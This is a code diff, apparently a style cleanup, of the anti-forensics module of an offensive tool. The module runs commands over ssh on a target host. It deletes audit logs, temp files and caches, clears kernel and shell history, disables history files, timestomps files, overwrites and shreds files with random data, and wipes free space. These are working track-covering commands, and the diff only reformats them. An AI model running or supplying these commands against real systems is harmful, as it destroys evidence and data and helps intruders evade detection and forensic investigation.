@@ -10,7 +10,6 @@ from __future__ import annotations
 import os
 import shlex
 import subprocess
-import tempfile
 
 import cmd2
 
@@ -20,7 +19,6 @@ from utils import (
     print_msg,
     print_warn,
 )
-
 
 ANTI_FORENSICS_CATEGORY = "11. Anti-Forensics"
 SHRED_PASSES = 7
@@ -64,13 +62,15 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
         ]
 
         if do_all:
-            commands.extend([
-                "rm -rf /var/log/audit/* /var/log/auditd/*",
-                "rm -rf /tmp/* /var/tmp/*",
-                "rm -rf /var/cache/*",
-                "dmesg -c",
-                "history -c",
-            ])
+            commands.extend(
+                [
+                    "rm -rf /var/log/audit/* /var/log/auditd/*",
+                    "rm -rf /tmp/* /var/tmp/*",
+                    "rm -rf /var/cache/*",
+                    "dmesg -c",
+                    "history -c",
+                ]
+            )
 
         if target:
             ssh_cmd = f"ssh {user}@{target}"
@@ -107,16 +107,12 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
             "unset HISTFILE HISTSIZE HISTFILESIZE",
         ]
         for p in path.split():
-            commands.append(
-                f"find {p} -type f -exec touch -t {reference_date} {{}} \\; 2>/dev/null"
-            )
-            commands.append(
-                f"find {p} -type d -exec touch -t {reference_date} {{}} \\; 2>/dev/null"
-            )
+            commands.append(f"find {p} -type f -exec touch -t {reference_date} {{}} \\; 2>/dev/null")
+            commands.append(f"find {p} -type d -exec touch -t {reference_date} {{}} \\; 2>/dev/null")
 
         if target:
             for cmd in commands:
-                full_cmd = f"ssh {user}@{target} \"{cmd}\""
+                full_cmd = f'ssh {user}@{target} "{cmd}"'
                 try:
                     subprocess.run(full_cmd, shell=True, timeout=30, stderr=subprocess.DEVNULL)
                 except (subprocess.TimeoutExpired, Exception):
@@ -154,7 +150,7 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
             ssh_base = f"ssh {user}@{target}"
             for i in range(passes):
                 cmd = f'{ssh_base} "dd if=/dev/urandom of={file_path} bs=1M conv=notrunc 2>/dev/null"'
-                print_msg(f"  Pass {i+1}/{passes}")
+                print_msg(f"  Pass {i + 1}/{passes}")
                 subprocess.run(cmd, shell=True, timeout=60, stderr=subprocess.DEVNULL)
             subprocess.run(f'{ssh_base} "rm -f {file_path}"', shell=True, timeout=10)
             print_msg(f"Shredded {file_path} on {target}")
@@ -163,7 +159,7 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
                 print_error(f"File not found: {file_path}")
                 return
             file_size = os.path.getsize(file_path)
-            for i in range(passes):
+            for _ in range(passes):
                 with open(file_path, "r+b") as f:
                     f.seek(0)
                     f.write(os.urandom(file_size))
@@ -189,7 +185,7 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
         if target:
             ssh_base = f"ssh {user}@{target}"
             wipe_cmds = [
-                f'filler=$(mktemp -p {path} filler.XXXXXX)',
+                f"filler=$(mktemp -p {path} filler.XXXXXX)",
                 'dd if=/dev/zero of="$filler" bs=1M 2>/dev/null || true',
                 'shred -n 3 -u "$filler" 2>/dev/null || rm -f "$filler"',
             ]
